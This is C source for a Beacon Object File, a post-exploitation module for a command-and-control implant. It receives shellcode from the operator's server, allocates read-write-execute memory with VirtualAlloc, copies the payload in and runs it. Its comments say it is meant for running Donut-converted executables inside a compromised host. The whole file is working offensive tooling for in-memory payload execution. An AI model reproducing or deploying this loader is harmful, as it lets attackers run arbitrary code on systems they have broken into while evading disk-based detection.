/*
 * Generic PIC Shellcode Loader BOF
 * 
 * Loads and executes position-independent shellcode passed as argument.
 * Used for executing Donut-converted PE files (.exe/.dll).
 * 
 * Arguments (packed):
 *   encoding (1 byte): 0=base32, 1=base64, 2=raw/hex
 *   shellcode_len (4 bytes, LE)
 *   shellcode_data (variable)
 * 
 * Build: clang -target x86_64-w64-windows-gnu -I ../Beacon/include/coff -c shellcode_loader.c -o shellcode_loader.o
 */

#include <stdbool.h>
#include <stdint.h>

#include "../Beacon/include/coff/beacon_compatibility.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(VOID);

/* Internal memcpy - use msvcrt$memset pattern for compatibility */
#define mem_copy(dst, src, len) __builtin_memcpy(dst, src, len)

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    if (len < 5) {
        BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Invalid args: need at least 5 bytes");
        return;
    }
    
    // Parse encoding
    int encoding = BeaconDataInt(&parser);
    if (encoding < 0 || encoding > 2) {
        BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Invalid encoding: %d", encoding);
        return;
    }
    
    // Parse shellcode length
    int shellcode_len = BeaconDataInt(&parser);
    if (shellcode_len <= 0 || shellcode_len > 10 * 1024 * 1024) {  // Max 10MB
        BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Invalid shellcode length: %d", shellcode_len);
        return;
    }
    
    // Get encoded shellcode
    char* encoded = BeaconDataExtract(&parser, &len);
    if (!encoded || len == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] No shellcode data");
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Received %d bytes encoded shellcode (encoding=%d)", len, encoding);
    
    // For now, expect raw shellcode (encoding=2)
    // Server will decode base32/base64 before sending
    char* shellcode = encoded;
    int decoded_len = len;
    
    if (decoded_len != shellcode_len) {
        BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Length mismatch: expected %d, got %d", shellcode_len, decoded_len);
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Allocating RWX memory for %d bytes", decoded_len);
    
    // Allocate RWX memory using beacon's VirtualAlloc
    void* mem = KERNEL32$VirtualAlloc(NULL, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] VirtualAlloc failed: %d", KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Allocated at 0x%p", mem);
    
    // Copy shellcode
    mem_copy(mem, shellcode, decoded_len);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Executing shellcode...");
    
    // Execute shellcode
    ((void(*)())mem)();
    
    BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Shellcode returned");
    
    // Free memory
    KERNEL32$VirtualFree(mem, 0, MEM_RELEASE);
    BeaconPrintf(CALLBACK_OUTPUT, "[shellcode_loader] Memory freed");
}